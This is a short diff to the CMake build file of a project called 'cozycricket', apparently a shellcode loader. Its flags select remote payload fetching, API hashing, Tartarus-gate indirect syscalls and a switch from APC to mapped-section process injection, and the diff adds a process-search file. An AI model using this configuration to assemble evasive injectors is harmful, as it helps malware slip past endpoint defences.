@@ -7,7 +7,7 @@ set(CMAKE_CXX_STANDARD 23)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 
 ### ----- START CHANGEME -----
-add_definitions(-DRETRIEVE_FETCH -DHASH_DJB2 -DRESOLVEDLL_TIB -DRESOLVEAPI_DOS -DGETSYSCALL_SORT_TARTARUS -DSYSCALL_INDIRECT -DINJECT_EXTERNAL_EBAPC)
+add_definitions(-DRETRIEVE_FETCH -DHASH_DJB2 -DRESOLVEDLL_TIB -DRESOLVEAPI_DOS -DGETSYSCALL_SORT_TARTARUS -DSYSCALL_INDIRECT -DINJECT_EXTERNAL_CREATE_MAP_SECTION -DFINDPID_GETNEXTPROCESS)
 ### ----- END CHANGEME -----
 
 add_executable(cozycricket
@@ -21,6 +21,7 @@ add_executable(cozycricket
     syscall/get_syscall.cpp
     syscall/syscalls.asm
     inject/inject.cpp
+    search/findpid.cpp
 )
 
 find_package(OpenSSL REQUIRED)
@@ -30,5 +31,7 @@ target_link_libraries(cozycricket PRIVATE
     OpenSSL::SSL
     OpenSSL::Crypto
     cpr::cpr
+    psapi
+    shlwapi
 )
 
